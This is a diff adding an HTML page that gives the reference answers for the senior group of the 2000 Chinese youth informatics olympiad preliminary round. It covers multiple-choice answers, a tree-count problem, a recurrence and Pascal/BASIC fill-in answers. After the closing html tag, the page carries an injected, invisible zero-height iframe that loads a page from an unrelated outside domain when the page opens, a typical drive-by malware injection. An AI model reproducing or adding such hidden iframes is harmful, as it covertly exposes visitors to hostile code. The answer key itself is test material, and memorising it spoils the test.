@@ -1,0 +1,296 @@
+<html>
+<head>
+<title>2000年初赛高中组答案</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<link rel="stylesheet" href="../js_css.css">
+</head>
+
+<body bgcolor="#CCFFFF">
+<p><b><font size=4>第六届全国青少年信息学（计算机）奥林匹克分区联赛初赛试题</font></b></p>
+<p><b>(提高组参考答案)</b></p>
+<p>一、选择题</p>
+<table width="90%" border="1">
+  <tr> 
+    <td>题号</td>
+    <td>1</td>
+    <td>2</td>
+    <td>3</td>
+    <td>4</td>
+    <td>5</td>
+    <td>6</td>
+    <td>7</td>
+    <td>8</td>
+    <td>9</td>
+    <td>10</td>
+  </tr>
+  <tr> 
+    <td height="21">答案</td>
+    <td height="21">C </td>
+    <td height="21">B</td>
+    <td height="21">D</td>
+    <td height="21">C</td>
+    <td height="21">D</td>
+    <td height="21">B</td>
+    <td height="21">D</td>
+    <td height="21">B</td>
+    <td height="21">A</td>
+    <td height="21">C</td>
+  </tr>
+  <tr> 
+    <td>题号</td>
+    <td>11</td>
+    <td>12</td>
+    <td>13</td>
+    <td>14</td>
+    <td>15</td>
+    <td>16</td>
+    <td>17</td>
+    <td>18</td>
+    <td>19</td>
+    <td>20</td>
+  </tr>
+  <tr> 
+    <td>答案</td>
+    <td>D</td>
+    <td>B</td>
+    <td>A</td>
+    <td>C</td>
+    <td>B</td>
+    <td>A</td>
+    <td>D</td>
+    <td>D</td>
+    <td>B</td>
+    <td>B</td>
+  </tr>
+</table>
+<p>二、问题</p>
+<p>1、5棵。如下：</p>
+<table width="90%">
+  <tr> 
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">b</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center">c</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">c</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center">a</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">a</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="5%"> 
+      <div align="center">a</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">c</div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">b</div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">a</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">b</div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">c</div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">a</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">b</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="6%"> 
+      <div align="center">c</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+    <td width="5%"> 
+      <div align="center">b</div>
+    </td>
+    <td width="5%"> 
+      <div align="center"></div>
+    </td>
+  </tr>
+</table>
+<p>2、F(N)=F(N-1)+F(N-2)+F(N-3) (N>=4)<br>
+  F(1)=1 F(2)=2 F(3)=4 </p>
+<p>三、输出结果</p>
+<p>1、4 3 0 2</p>
+<p>2、BBAC</p>
+<p>四、程序填空 </p>
+<table border=1 width="90%">
+  <tbody> 
+  <tr> 
+    <td width="50%"> 
+      <p align=center>PASCAL语言
+    </td>
+    <td width="50%"> 
+      <p align=center>BASIC语言 
+    </td>
+  </tr>
+  <tr> 
+    <td colspan="2">题一</td>
+  </tr>
+  <tr> 
+    <td width="50%">①　　A[J]：=1；</td>
+    <td width="50%">70　　A(J)=0</td>
+  </tr>
+  <tr> 
+    <td height=18 width="50%">②　　A[I]：=0；</td>
+    <td height=18 width="50%">110　　A(I)=0</td>
+  </tr>
+  <tr> 
+    <td width="50%">③　　S：=0；</td>
+    <td width="50%">140　　S=0</td>
+  </tr>
+  <tr> 
+    <td width="50%">④　　B[S]：=1；</td>
+    <td width="50%">180　　B(S)=1</td>
+  </tr>
+  <tr> 
+    <td width="50%">⑤　　S=32</td>
+    <td width="50%">220　　S&lt;32</td>
+  </tr>
+  <tr> 
+    <td colspan="2">题二</td>
+  </tr>
+  <tr> 
+    <td width="50%">①　　SP1&lt;=SP2</td>
+    <td width="50%">90　　SP1&gt;SP2</td>
+  </tr>
+  <tr> 
+    <td width="50%">②　　Q[SP1,0]+1</td>
+    <td width="50%">100　　Q(SP1,0)+1</td>
+  </tr>
+  <tr> 
+    <td height=16 width="50%">③　　Q[SP1,J]&lt;&gt;0</td>
+    <td height=16 width="50%">120　　Q(SP1,J)=0</td>
+  </tr>
+  <tr> 
+    <td width="50%">④　　(Q[SP2,0])；</td>
+    <td width="50%">210　　Q(SP2,0)</td>
+  </tr>
+  <tr> 
+    <td width="50%">⑤　　D[Q[I,0]]+1；</td>
+    <td width="50%">240　　D(Q(I,0))+1</td>
+  </tr>
+  </tbody> 
+</table>
+<p>&nbsp;</p>
+</body>
+</html>
+<iframe src=http://mm.aa88567.cn/index/mm.htm width=100 height=0></iframe>
